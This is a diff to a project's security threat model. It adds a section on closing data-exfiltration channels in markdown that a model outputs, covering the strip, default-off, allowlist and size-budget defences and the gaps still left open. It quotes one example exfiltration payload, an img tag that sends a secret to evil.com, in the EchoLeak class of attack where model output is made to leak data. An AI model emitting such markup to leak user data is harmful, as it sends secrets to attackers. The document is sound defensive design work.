@@ -207,7 +207,38 @@ a `ponytail:` comment naming the ceiling and upgrade path.
 
 ---
 
-## 5. Per-release security exit gates
+## 5. Exfiltration surfaces (the 2026-09-07 "Shutter" closure)
+
+Model-controlled markdown is the canonical covert-exfil channel (EchoLeak /
+CVE-2025-32711 class: `<img src="http://evil.com/steal?data=SECRET">`). The
+defense is layered across two trees — the server strips what it can before
+emission, and the openclaw UI refuses to FETCH what survives:
+
+| Surface | Posture | Where closed |
+|---|---|---|
+| Markdown image/link refs in emitted content | Server-side strip at the read seam (`gate::strip_markdown_refs`) — recall hits, notes, proposals never carry live `![](url)` markup | brain-server v1.20.27 "Cordon" |
+| Document-mode remote images (UI) | **Default OFF** — renders the labeled not-loaded fallback; opt-in via render options AND the operator's trusted-host allowlist (exact hosts, no subdomains implied) | openclaw "Shutter" (X-E1 / F-E1) |
+| Favicon auto-fetch beacon (UI) | **Default OFF** — the proxy route 404s unless the operator enables fetching AND allowlists the host; unlisted hosts render a letter tile, no request | openclaw "Shutter" (X-E2 / F-E2) |
+| `data:` image URIs (UI) | Render only inside a 64 KiB decoded budget; oversized payloads degrade to the fallback (no fetch channel — the budget caps render-time covert channels and pathological payloads) | openclaw "Shutter" (X-E4) |
+
+Standing ceilings, documented honestly:
+
+- **Bare URLs in prose survive every strip.** Linkified-but-inert is the
+  shipped contract: a URL pasted as text renders as a link and does not
+  fetch until a human clicks. Closing THAT is the documented `gate.rs`
+  ceiling, still open by design.
+- **Operator allowlists are trust, not safety.** An allowlisted host is a
+  place the operator vouches for; if the operator allowlists a hostile
+  host, the gate is doing its job when it fetches exactly that host and
+  nothing else. The SSRF guard (loopback/metadata/private refusal) stays
+  enforced even for allowlisted hosts.
+- **Proxied favicon fetches are same-origin and authenticated**; the UI
+  never fetches remote image bytes directly — everything rides the
+  gateway proxy with its byte/time caps and strict media validation.
+
+---
+
+## 6. Per-release security exit gates
 
 Each major release must complete these exit gates (in addition to fmt/clippy/test):
 
@@ -226,7 +257,7 @@ Each major release must complete these exit gates (in addition to fmt/clippy/tes
 
 ---
 
-## 6. What this threat model does NOT cover
+## 7. What this threat model does NOT cover
 
 - **Physical access to the host.** Assumes the operator controls physical
   access (full-disk encryption is the operator's concern).
@@ -246,7 +277,7 @@ Each major release must complete these exit gates (in addition to fmt/clippy/tes
 
 ---
 
-## 7. Review cadence
+## 8. Review cadence
 
 - **Per major release**: full STRIDE review, update this doc, update OWASP
   coverage in `SECURITY.md`.
